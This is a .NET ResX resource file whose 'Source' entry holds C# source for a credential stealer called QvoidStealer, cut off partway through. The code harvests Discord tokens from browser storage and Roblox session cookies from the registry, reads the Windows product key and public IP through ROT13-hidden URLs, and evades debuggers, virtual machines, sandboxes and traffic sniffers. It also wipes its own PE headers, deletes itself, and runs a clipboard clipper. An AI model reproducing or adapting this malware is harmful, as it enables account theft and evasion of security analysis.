<?xml version="1.0" encoding="utf-8"?>
<root>
  <!-- 
    Microsoft ResX Schema 
    
    Version 2.0
    
    The primary goals of this format is to allow a simple XML format 
    that is mostly human readable. The generation and parsing of the 
    various data types are done through the TypeConverter classes 
    associated with the data types.
    
    Example:
    
    ... ado.net/XML headers & schema ...
    <resheader name="resmimetype">text/microsoft-resx</resheader>
    <resheader name="version">2.0</resheader>
    <resheader name="reader">System.Resources.ResXResourceReader, System.Windows.Forms, ...</resheader>
    <resheader name="writer">System.Resources.ResXResourceWriter, System.Windows.Forms, ...</resheader>
    <data name="Name1"><value>this is my long string</value><comment>this is a comment</comment></data>
    <data name="Color1" type="System.Drawing.Color, System.Drawing">Blue</data>
    <data name="Bitmap1" mimetype="application/x-microsoft.net.object.binary.base64">
        <value>[base64 mime encoded serialized .NET Framework object]</value>
    </data>
    <data name="Icon1" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
        <value>[base64 mime encoded string representing a byte array form of the .NET Framework object]</value>
        <comment>This is a comment</comment>
    </data>
                
    There are any number of "resheader" rows that contain simple 
    name/value pairs.
    
    Each data row contains a name, and value. The row also contains a 
    type or mimetype. Type corresponds to a .NET class that support 
    text/value conversion through the TypeConverter architecture. 
    Classes that don't support this are serialized and stored with the 
    mimetype set.
    
    The mimetype is used for serialized objects, and tells the 
    ResXResourceReader how to depersist the object. This is currently not 
    extensible. For a given mimetype the value must be set accordingly:
    
    Note - application/x-microsoft.net.object.binary.base64 is the format 
    that the ResXResourceWriter will generate, however the reader can 
    read any of the formats listed below.
    
    mimetype: application/x-microsoft.net.object.binary.base64
    value   : The object must be serialized with 
            : System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
            : and then encoded with base64 encoding.
    
    mimetype: application/x-microsoft.net.object.soap.base64
    value   : The object must be serialized with 
            : System.Runtime.Serialization.Formatters.Soap.SoapFormatter
            : and then encoded with base64 encoding.

    mimetype: application/x-microsoft.net.object.bytearray.base64
    value   : The object must be serialized into a byte array 
            : using a System.ComponentModel.TypeConverter
            : and then encoded with base64 encoding.
    -->
  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
    <xsd:import namespace="http://www.w3.org/XML/1998/namespace" />
    <xsd:element name="root" msdata:IsDataSet="true">
      <xsd:complexType>
        <xsd:choice maxOccurs="unbounded">
          <xsd:element name="metadata">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" />
              </xsd:sequence>
              <xsd:attribute name="name" use="required" type="xsd:string" />
              <xsd:attribute name="type" type="xsd:string" />
              <xsd:attribute name="mimetype" type="xsd:string" />
              <xsd:attribute ref="xml:space" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="assembly">
            <xsd:complexType>
              <xsd:attribute name="alias" type="xsd:string" />
              <xsd:attribute name="name" type="xsd:string" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="data">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
              </xsd:sequence>
              <xsd:attribute name="name" type="xsd:string" use="required" msdata:Ordinal="1" />
              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
              <xsd:attribute ref="xml:space" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="resheader">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
              </xsd:sequence>
              <xsd:attribute name="name" type="xsd:string" use="required" />
            </xsd:complexType>
          </xsd:element>
        </xsd:choice>
      </xsd:complexType>
    </xsd:element>
  </xsd:schema>
  <resheader name="resmimetype">
    <value>text/microsoft-resx</value>
  </resheader>
  <resheader name="version">
    <value>2.0</value>
  </resheader>
  <resheader name="reader">
    <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </resheader>
  <resheader name="writer">
    <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </resheader>
  <data name="Source" xml:space="preserve">
    <value>using QvoidStealer.Main;
using QvoidWrapper;
using System;
using System.Globalization;
using System.Threading;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.Drawing;
using System.IO.Compression;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Security.Principal;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using static QvoidWrapper.DiscordWebhook;
using QvoidStealer.Miscellaneous.Stealers.Browsers;
using Microsoft.Win32;
using Newtonsoft.Json.Linq;
using Newtonsoft.Json;
using System.Management;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Security.Cryptography;
using System.Text;
using System.Net.Security;
using static QvoidStealer.Miscellaneous.Stealers.Browsers.ChromiumGrabber;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System.Data.SQLite;
using System.Collections;

namespace QvoidStealer
{
    internal static class Program
    {
        [STAThread]
        static void Main(string[] args)
        {
            var mainThread = new Thread(() =&gt;
            {
                Thread.CurrentThread.CurrentCulture = CultureInfo.InvariantCulture;
                Thread.CurrentThread.CurrentUICulture = CultureInfo.InvariantCulture;

                Console.WriteLine(@"https://sir_I_am_illusioning_or_you_reading_me?_");

                Protection.WebSniffers(Settings.AntiWebSinffers);
                Protection.AntiDebug(Settings.AntiDebug);
                Protection.DetectVM(Settings.AntiVM);
                Protection.Sandboxie(Settings.AntiSandBoxie);
                Protection.Emulation(Settings.AntiEmulation);

                Grabber.Initialize(args);
                Grabber.DeleteTraces(false, false);

                if (Settings.Clipper.Enabled)
                    Settings.Clipper.Start();

                Environment.Exit(0);
            });
            mainThread.SetApartmentState(ApartmentState.STA);
            mainThread.Start();

            Thread.Sleep(-1);
        }
    }
}

namespace QvoidWrapper
{
    static public class Other
    {
        static public List&lt;string&gt; FindTokensGecko(List&lt;string&gt; geckoBasedLocations, string DiscordFileName)
        {
            var tokens = new List&lt;string&gt;();
            List&lt;Thread&gt; threads = new List&lt;Thread&gt;();

            foreach (var dir in geckoBasedLocations)
            {
                if (!Directory.Exists(dir))
                    continue;

                foreach (var subDir in Directory.GetDirectories(dir))
                {
                    var thread = new Thread(() =&gt;
                    {
                        var files = Directory.GetFiles(subDir);
                        foreach (var file in files)
                        {
                            if (!file.EndsWith(".sqlite"))
                                continue;

                            try
                            {
                                string fileContent = string.Empty;

                                using (FileStream fs = new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                                using (StreamReader sr = new StreamReader(fs))
                                    fileContent = sr.ReadToEnd();

                                MatchCollection matches = Regex.Matches(fileContent, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", RegexOptions.Compiled);
                                MatchCollection mfaMatches = Regex.Matches(fileContent, @"mfa\.[\w-]{84}", RegexOptions.Compiled);
                                MatchCollection encryptedMatches = Regex.Matches(fileContent, "(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)", RegexOptions.Compiled);

                                foreach (Match match in matches)
                                    if (!tokens.Contains(match.Value))
                                        tokens.Add(match.Value);

                                foreach (Match match in mfaMatches)
                                    if (!tokens.Contains(match.Value))
                                        tokens.Add(match.Value);

                                foreach (Match match in encryptedMatches)
                                    if (!tokens.Contains(match.Value))
                                        tokens.Add(match.Value);
                            }
                            catch (Exception)
                            {
                                foreach (var locker in ProcessHandler.WhoIsLocking(file))
                                {
                                    try
                                    {
                                        if (locker.MainModule.FileName == DiscordFileName)
                                            continue;
                                    }
                                    catch { }

                                    try { locker.Kill(); }
                                    catch { continue; }
                                }
                            }
                        }
                    });
                    threads.Add(thread);
                    thread.Start();
                }
            }

            while (true)
                if (threads.All(t =&gt; !t.IsAlive))
                    break;

            return tokens;
        }

        static public List&lt;string&gt; FindTokens(List&lt;string&gt; possibleLocations, string DiscordFileName)
        {
            var tokens = new List&lt;string&gt;();
            List&lt;Thread&gt; threads = new List&lt;Thread&gt;();

            foreach (var dir in possibleLocations)
            {
                if (!Directory.Exists(dir))
                    continue;

                var thread = new Thread(() =&gt;
                {
                    var files = Directory.GetFiles(dir);
                    foreach (var file in files)
                    {
                        if (!file.EndsWith(".log") &amp;&amp; !file.EndsWith(".ldb"))
                            continue;

                        try
                        {
                            string fileContent = string.Empty;

                            using (FileStream fs = new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                            using (StreamReader sr = new StreamReader(fs))
                                fileContent = sr.ReadToEnd();

                            MatchCollection matches = Regex.Matches(fileContent, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", RegexOptions.Compiled);
                            MatchCollection mfaMatches = Regex.Matches(fileContent, @"mfa\.[\w-]{84}", RegexOptions.Compiled);
                            MatchCollection encryptedMatches = Regex.Matches(fileContent, "(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)", RegexOptions.Compiled);

                            foreach (Match match in matches)
                                if (!tokens.Contains(match.Value))
                                    tokens.Add(match.Value);

                            foreach (Match match in mfaMatches)
                                if (!tokens.Contains(match.Value))
                                    tokens.Add(match.Value);

                            foreach (Match match in encryptedMatches)
                                if (!tokens.Contains(match.Value))
                                    tokens.Add(match.Value);
                        }
                        catch (Exception)
                        {
                            foreach (var locker in ProcessHandler.WhoIsLocking(file))
                            {
                                try
                                {
                                    if (locker.MainModule.FileName == DiscordFileName)
                                        continue;
                                }
                                catch { }

                                try { locker.Kill(); }
                                catch { continue; }
                            }
                        }
                    }
                });
                threads.Add(thread);
                thread.Start();
            }

            while (true)
                if (threads.All(t =&gt; !t.IsAlive))
                    break;

            return tokens;
        }

        static public string Sort(string input)
        {
            char temp;
            char[] charstr = input.ToCharArray();
            for (int i = 1; i &lt; charstr.Length; i++)
            {
                for (int j = 0; j &lt; charstr.Length - 1; j++)
                {
                    if (charstr[j] &gt; charstr[j + 1])
                    {
                        temp = charstr[j];
                        charstr[j] = charstr[j + 1];
                        charstr[j + 1] = temp;
                    }
                }
            }

            return new string(charstr);
        }

        static public void ExecuteCommand(string fileName, string Args)
        {
            if (!IsAdministrator())
                throw new Exception("Program is not administrator");

            using (Process process = new Process())
            {
                if (Args != "")
                    process.StartInfo.Arguments = Args;

                process.StartInfo.FileName = fileName;
                process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                process.StartInfo.UseShellExecute = true;
                process.StartInfo.Verb = "runas";
                process.Start();
            }
        }

        static public bool IsAdministrator()
        {
            return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
        }

        static public void ForceAdministrator()
        {
            while (!IsAdministrator())
            {
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.UseShellExecute = true;
                startInfo.WorkingDirectory = Environment.CurrentDirectory;
                startInfo.FileName = Application.ExecutablePath;
                startInfo.Verb = "runas";

                try { Process.Start(startInfo); }
                catch { continue; }
                Environment.Exit(0);
            }
        }

        static public Color Spectrum(int mode, float time = 0f)
        {
            time = time == 0f ? (float)((DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() % 62830) / 2000.0) : time;
            return Color.FromArgb(255,
                   (int)((Math.Sin(time + (mode / Math.PI)) * .5f + .5f) * 255.0f),
                   (int)((Math.Sin(time + (mode / Math.PI) + 2 * Math.PI / 3) * .5f + .5f) * 255.0f),
                   (int)((Math.Sin(time + (mode / Math.PI) + 4 * Math.PI / 3) * .5f + .5f) * 255.0f));
        }

        static public void SelfDestruct()
        {
            string strName = "destruct.bat";
            string strPath = Path.Combine(Directory.GetCurrentDirectory(), strName);
            string strExe = new FileInfo(Application.ExecutablePath).Name;

            StreamWriter swDestruct = new StreamWriter(strPath);
            swDestruct.WriteLine("attrib \"" + strExe + "\"" + " -a -s -r -h");
            swDestruct.WriteLine(":Repeat");
            swDestruct.WriteLine("del " + "\"" + strExe + "\"");
            swDestruct.WriteLine("if exist \"" + strExe + "\"" + " goto Repeat");
            swDestruct.WriteLine("del \"" + strName + "\"");
            swDestruct.Close();

            Process procDestruct = new Process();
            procDestruct.StartInfo.FileName = "destruct.bat";
            procDestruct.StartInfo.CreateNoWindow = true;
            procDestruct.StartInfo.UseShellExecute = false;

            try
            {
                procDestruct.Start();
            }
            catch (Exception)
            {
                Application.Exit();
            }
        }

        static public string RobloxCookies()
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com", false))
                {
                    if (key == null)
                        return null;

                    string cookie = key.GetValue(".ROBLOSECURITY").ToString();
                    return cookie.Substring(46).Trim('&gt;');
                }
            }
            catch
            { return null; }
        }
    }

    static public class ProcessHandler
    {
        [StructLayout(LayoutKind.Sequential)]
        struct RM_UNIQUE_PROCESS
        {
            public int dwProcessId;
            public System.Runtime.InteropServices.ComTypes.FILETIME ProcessStartTime;
        }

        const int RmRebootReasonNone = 0;
        const int CCH_RM_MAX_APP_NAME = 255;
        const int CCH_RM_MAX_SVC_NAME = 63;

        enum RM_APP_TYPE
        {
            RmUnknownApp = 0,
            RmMainWindow = 1,
            RmOtherWindow = 2,
            RmService = 3,
            RmExplorer = 4,
            RmConsole = 5,
            RmCritical = 1000
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct RM_PROCESS_INFO
        {
            public RM_UNIQUE_PROCESS Process;

            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = CCH_RM_MAX_APP_NAME + 1)]
            public string strAppName;

            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = CCH_RM_MAX_SVC_NAME + 1)]
            public string strServiceShortName;

            public RM_APP_TYPE ApplicationType;
            public uint AppStatus;
            public uint TSSessionId;
            [MarshalAs(UnmanagedType.Bool)]
            public bool bRestartable;
        }

        [DllImport("rstrtmgr.dll", CharSet = CharSet.Unicode)]
        static extern int RmRegisterResources(uint pSessionHandle,
                                            UInt32 nFiles,
                                            string[] rgsFilenames,
                                            UInt32 nApplications,
                                            [In] RM_UNIQUE_PROCESS[] rgApplications,
                                            UInt32 nServices,
                                            string[] rgsServiceNames);

        [DllImport("rstrtmgr.dll", CharSet = CharSet.Auto)]
        static extern int RmStartSession(out uint pSessionHandle, int dwSessionFlags, string strSessionKey);

        [DllImport("rstrtmgr.dll")]
        static extern int RmEndSession(uint pSessionHandle);

        [DllImport("rstrtmgr.dll")]
        static extern int RmGetList(uint dwSessionHandle,
                                    out uint pnProcInfoNeeded,
                                    ref uint pnProcInfo,
                                    [In, Out] RM_PROCESS_INFO[] rgAffectedApps,
                                    ref uint lpdwRebootReasons);

        static public List&lt;Process&gt; WhoIsLocking(string path)
        {
            uint handle;
            string key = Guid.NewGuid().ToString();
            List&lt;Process&gt; processes = new List&lt;Process&gt;();

            int res = RmStartSession(out handle, 0, key);
            if (res != 0) throw new Exception("Could not begin restart session.  Unable to determine file locker.");

            try
            {
                const int ERROR_MORE_DATA = 234;
                uint pnProcInfoNeeded = 0,
                    pnProcInfo = 0,
                    lpdwRebootReasons = RmRebootReasonNone;

                string[] resources = new string[] { path };

                res = RmRegisterResources(handle, (uint)resources.Length, resources, 0, null, 0, null);

                if (res != 0) throw new Exception("Could not register resource.");
                res = RmGetList(handle, out pnProcInfoNeeded, ref pnProcInfo, null, ref lpdwRebootReasons);

                if (res == ERROR_MORE_DATA)
                {
                    RM_PROCESS_INFO[] processInfo = new RM_PROCESS_INFO[pnProcInfoNeeded];
                    pnProcInfo = pnProcInfoNeeded;

                    res = RmGetList(handle, out pnProcInfoNeeded, ref pnProcInfo, processInfo, ref lpdwRebootReasons);
                    if (res == 0)
                    {
                        processes = new List&lt;Process&gt;((int)pnProcInfo);
                        for (int i = 0; i &lt; pnProcInfo; i++)
                        {
                            try
                            {
                                processes.Add(Process.GetProcessById(processInfo[i].Process.dwProcessId));
                            }
                            catch (ArgumentException) { }
                        }
                    }
                    else throw new Exception("Could not list processes locking resource.");
                }
                else if (res != 0) throw new Exception("Could not list processes locking resource. Failed to get size of result.");
            }
            finally
            {
                RmEndSession(handle);
            }

            return processes;
        }

        public static void remoteProcessKill(string computerName, string userName, string pword, string processName)
        {
            var connectoptions = new ConnectionOptions();
            connectoptions.Username = userName;
            connectoptions.Password = pword;

            ManagementScope scope = new ManagementScope(@"\\" + computerName + @"\root\cimv2", connectoptions);

            // WMI query
            var query = new SelectQuery("select * from Win32_process where name = '" + processName + "'");

            using (var searcher = new ManagementObjectSearcher(scope, query))
            {
                foreach (ManagementObject process in searcher.Get())
                {
                    process.InvokeMethod("Terminate", null);
                    process.Dispose();
                }
            }
        }

        public static void localProcessKill(string processName)
        {
            foreach (Process p in Process.GetProcessesByName(processName))
            {
                p.Kill();
            }
        }

        [DllImport("kernel32.dll")]
        public static extern bool MoveFileEx(string lpExistingFileName, string lpNewFileName, int dwFlags);

        public const int MOVEFILE_DELAY_UNTIL_REBOOT = 0x4;

    }

    static public class Protection
    {
        [DllImport("ntdll.dll")]
        internal static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        [DllImport("ntdll.dll")]
        internal static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        internal static extern void BlockInput([In, MarshalAs(UnmanagedType.Bool)] bool fBlockIt);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        internal static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

        [DllImport("kernel32.dll", SetLastError = true)]
        internal static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("Kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        internal static extern bool GetModuleHandleEx(UInt32 dwFlags, string lpModuleName, out IntPtr phModule);

        [DllImport("kernel32.dll")]
        internal static extern IntPtr ZeroMemory(IntPtr addr, IntPtr size);

        [DllImport("kernel32.dll")]
        internal static extern IntPtr VirtualProtect(IntPtr lpAddress, IntPtr dwSize, IntPtr flNewProtect, ref IntPtr lpflOldProtect);

        internal static void EraseSection(IntPtr address, int size)
        {
            IntPtr sz = (IntPtr)size;
            IntPtr dwOld = default(IntPtr);
            VirtualProtect(address, sz, (IntPtr)0x40, ref dwOld);
            ZeroMemory(address, sz);
            IntPtr temp = default(IntPtr);
            VirtualProtect(address, sz, dwOld, ref temp);
        }

        public struct PE
        {
            static public int[] SectionTabledWords = new int[] { 0x8, 0xC, 0x10, 0x14, 0x18, 0x1C, 0x24 };
            static public int[] Bytes = new int[] { 0x1A, 0x1B };
            static public int[] Words = new int[] { 0x4, 0x16, 0x18, 0x40, 0x42, 0x44, 0x46, 0x48, 0x4A, 0x4C, 0x5C, 0x5E };
            static public int[] dWords = new int[] { 0x0, 0x8, 0xC, 0x10, 0x16, 0x1C, 0x20, 0x28, 0x2C, 0x34, 0x3C, 0x4C, 0x50, 0x54, 0x58, 0x60, 0x64, 0x68, 0x6C, 0x70, 0x74, 0x104, 0x108, 0x10C, 0x110, 0x114, 0x11C };
        }

        private static string _Id;
        private static int _UniqueSeed = 0;

        static private bool Valid(bool Exit, string[] _rootCaPublicKeys, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslpolicyerrors)
        {
            if (sslpolicyerrors != SslPolicyErrors.None) return false;

            var rootCertificate = SelfSignedCertificate(chain);
            var publicKey = Convert.ToBase64String(rootCertificate.PublicKey.EncodedKeyValue.RawData);
            var result = rootCertificate.Verify() &amp;&amp; _rootCaPublicKeys.Contains(publicKey);
            if (!result &amp;&amp; Exit)
                Environment.FailFast("Some retard who thinks he can reverse this application.");

            return result;
        }

        static private X509Certificate2 SelfSignedCertificate(X509Chain chain)
        {
            foreach (var x509ChainElement in chain.ChainElements)
            {
                if (x509ChainElement.Certificate.SubjectName.Name != x509ChainElement.Certificate.IssuerName.Name) continue;
                return x509ChainElement.Certificate;
            }
            throw new Exception("Self-signed certificate not found.");
        }

        static public void WebSniffers(bool Exit)
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;

            HttpWebRequest.DefaultWebProxy = new WebProxy();
            WebRequest.DefaultWebProxy = new WebProxy();

            if (GetModuleHandle("HTTPDebuggerBrowser.dll") != IntPtr.Zero || GetModuleHandle("FiddlerCore4.dll") != IntPtr.Zero || GetModuleHandle("RestSharp.dll") != IntPtr.Zero || GetModuleHandle("Titanium.Web.Proxy.dll") != IntPtr.Zero)
            {
                Debug.WriteLine("HTTP Debugger detected");
                if (Exit)
                    Environment.FailFast("Some retard who thinks he can reverse this application.");
            }

            //try
            //{
            //    var request = (HttpWebRequest)WebRequest.Create(Encryption.ROT13("uggcf://jjj.qebcobk.pbz/bnhgu2/nhgubevmr"));
            //    request.ServerCertificateValidationCallback = (sender, cert, chain, error) =&gt; Valid(Exit, new List&lt;string&gt;() { "MIIBCgKCAQEAxszlc+b71LvlLS0ypt/lgT/JzSVJtnEqw9WUNGeiChywX2mmQLHEt7KP0JikqUFZOtPclNY823Q4pErMTSWC90qlUxI47vNJbXGRfmO2q6Zfw6SE+E9iUb74xezbOJLjBuUIkQzEKEFV+8taiRV+ceg1v01yCT2+OjhQW3cxG42zxyRFmqesbQAUWgS3uhPrUQqYQUEiTmVhh4FBUKZ5XIneGUpX1S7mXRxTLH6YzRoGFqRoc9A0BBNcoXHTWnxV215k4TeHMFYE5RG0KYAS8Xk5iKICEXwnZreIt3jyygqoOKsKZMK/Zl2VhMGhJR6HXRpQCyASzEG7bgtROLhLywIDAQAB" }.ToArray(), cert, chain, error);

            //    HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            //    response.Close();
            //}
            //catch { }
        }

        static public void AntiDebug(bool Exit)
        {
#if !DEBUG
            bool isDebuggerPresent = true;
            CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
            if (isDebuggerPresent)
            {
                Debug.WriteLine("Fuck you!");
                if (Exit)
                    Environment.FailFast("Some retard who thinks he can reverse this application.");
            }
#endif
        }

        static public void Sandboxie(bool Exit)
        {
            if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
            {
                Debug.WriteLine("Sandboxie detected");
                if (Exit)
                    Environment.FailFast("Some retard who thinks he can reverse this application.");
            }
        }

        static public void Emulation(bool Exit)
        {
            long tickCount = Environment.TickCount;
            Thread.Sleep(500);
            long tickCount2 = Environment.TickCount;
            if (((tickCount2 - tickCount) &lt; 500L))
            {
                Debug.WriteLine("Emulation Detected");
                if (Exit)
                    Environment.FailFast("Some retard who thinks he can reverse this application.");
            }
        }

        static public void DetectVM(bool Exit)
        {
            using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
                foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
                    if ((managementBaseObject["Manufacturer"].ToString().ToLower() == "microsoft corporation" &amp;&amp; managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || managementBaseObject["Manufacturer"].ToString().ToLower().Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
                    {
                        Debug.WriteLine("VM Detected");
                        if (Exit)
                            Environment.FailFast("Some retard who thinks he can reverse this application.");
                    }

            foreach (ManagementBaseObject managementBaseObject2 in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
                if (managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VMware") &amp;&amp; managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VBox"))
                {
                    Debug.WriteLine("VM Detected");
                    if (Exit)
                        Environment.FailFast("Some retard who thinks he can reverse this application.");
                }
        }

        static public string DiskId()
        {
            if (!String.IsNullOrEmpty(_Id))
                return _Id;

            try
            {
                ManagementObject _Disk = new ManagementObject(@"win32_logicaldisk.deviceid=""c:""");
                _Disk.Get();

                _Id = $"{_Disk["VolumeSerialNumber"]}";
            }
            catch { _Id = "9SB42HS"; }

            return DiskId();
        }

        static public int UniqueSeed()
        {
            if (_UniqueSeed != 0)
                return _UniqueSeed;

            DiskId();

            int seed = 0;
            foreach (char i in _Id)
                seed += (int)Char.GetNumericValue(i);

            _UniqueSeed = seed;
            return seed;
        }

        static public void AntiDump()
        {
            var process = Process.GetCurrentProcess();
            var base_address = process.MainModule.BaseAddress;
            var dwpeheader = Marshal.ReadInt32((IntPtr)(base_address + 0x3C));
            var wnumberofsections = Marshal.ReadInt16((IntPtr)(base_address + dwpeheader + 0x6));

            EraseSection(base_address, 30);

            for (int i = 0; i &lt; PE.dWords.Length; i++)
                EraseSection((IntPtr)(base_address + dwpeheader + PE.dWords[i]), 4);

            for (int i = 0; i &lt; PE.Words.Length; i++)
                EraseSection((IntPtr)(base_address + dwpeheader + PE.Words[i]), 2);

            for (int i = 0; i &lt; PE.Bytes.Length; i++)
                EraseSection((IntPtr)(base_address + dwpeheader + PE.Bytes[i]), 1);

            int x = 0;
            int y = 0;

            while (x &lt;= wnumberofsections)
            {
                if (y == 0)
                    EraseSection((IntPtr)((base_address + dwpeheader + 0xFA + (0x28 * x)) + 0x20), 2);

                EraseSection((IntPtr)((base_address + dwpeheader + 0xFA + (0x28 * x)) + PE.SectionTabledWords[y]), 4);

                y++;

                if (y == PE.SectionTabledWords.Length)
                {
                    x++;
                    y = 0;
                }
            }
        }
    }

    public class Machine
    {
        static private string[] SizeSuffixes { get; } = { "bytes", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB" };
        public string WindowsLicense { get; private set; }
        public string PublicIPv4 { get; private set; }
        public string LanIPv4 { get; private set; }
        public string OsName { get; private set; }
        public string OsArchitecture { get; private set; }
        public string OsVersion { get; private set; }
        public string ProcessName { get; private set; }
        public string GpuVideo { get; private set; }
        public string GpuVersion { get; private set; }
        public string DiskDetails { get; private set; }
        public string PcMemory { get; private set; }

        public Machine()
        {
            ManagementObjectSearcher ObjSearcher = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
            foreach (ManagementObject _obj in ObjSearcher.Get())
            {
                if (_obj["Caption"] != null)
                    OsName = _obj["Caption"].ToString();

                if (_obj["OSArchitecture"] != null)
                    OsArchitecture = _obj["OSArchitecture"].ToString();

                if (_obj["Version"] != null)
                    OsVersion = _obj["Version"].ToString();
            }

            RegistryKey CentralProcessor = Registry.LocalMachine.OpenSubKey(@"Hardware\Description\System\CentralProcessor\0", RegistryKeyPermissionCheck.ReadSubTree);

            if (CentralProcessor != null)
            {
                var value = CentralProcessor.GetValue("ProcessorNameString");
                if (value != null)
                    ProcessName = value.ToString();
            }

            ObjSearcher = new ManagementObjectSearcher("select * from Win32_VideoController");
            foreach (ManagementObject _obj in ObjSearcher.Get())
            {
                GpuVideo = _obj["VideoProcessor"].ToString();
                GpuVersion = _obj["DriverVersion"].ToString();
            }

            DriveInfo[] Drives = DriveInfo.GetDrives();
            foreach (DriveInfo _drive in Drives)
                if (_drive.IsReady)
                    DiskDetails += $"Drive {_drive.Name}\\ - {SizeSuffix(_drive.AvailableFreeSpace)}/{SizeSuffix(_drive.TotalSize)}{Environment.NewLine}";

            ObjSearcher = new ManagementObjectSearcher("SELECT Capacity FROM Win32_PhysicalMemory");

            Int64 Capacity = 0;
            foreach (ManagementObject WniPART in ObjSearcher.Get())
                Capacity += Convert.ToInt64(WniPART.Properties["Capacity"].Value);

            PcMemory = SizeSuffix(Capacity);

            IPHostEntry ipHostEntry = Dns.GetHostEntry(string.Empty);
            foreach (IPAddress address in ipHostEntry.AddressList)
            {
                if (address.AddressFamily == AddressFamily.InterNetwork)
                {
                    LanIPv4 = address.ToString();
                    break;
                }
            }

            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(Encryption.ROT13("uggc://vspbasvt.zr"));
            request.Proxy = null;
            request.UserAgent = "curl";
            try
            {
                PublicIPv4 = new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd().Replace("\n", "").Replace("\r", "");
            }
            catch
            { }

            if (string.IsNullOrEmpty(PublicIPv4))
            {
                request = (HttpWebRequest)WebRequest.Create(Encryption.ROT13("uggcf://ncv.vcvsl.bet?sbezng=wfba"));
                request.Proxy = null;
                request.UserAgent = "curl";
                try
                {
                    PublicIPv4 = JObject.Parse(new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd().Replace("\n", "").Replace("\r", ""))["ip"].ToString();
                }
                catch { }
            }

            WindowsLicense = GetProductKey();
        }

        public static string GetProductKey()
        {
            var localKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32);

            if (Environment.Is64BitOperatingSystem)
                localKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);

            var registryKeyValue = localKey.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion").GetValue("DigitalProductId");
            if (registryKeyValue == null)
                return "Failed to get DigitalProductId from registry";
            var digitalProductId = (byte[])registryKeyValue;

            return DecodeProductKey(digitalProductId);
        }

        private static string DecodeProductKey(byte[] digitalProductId)
        {
            var key = String.Empty;
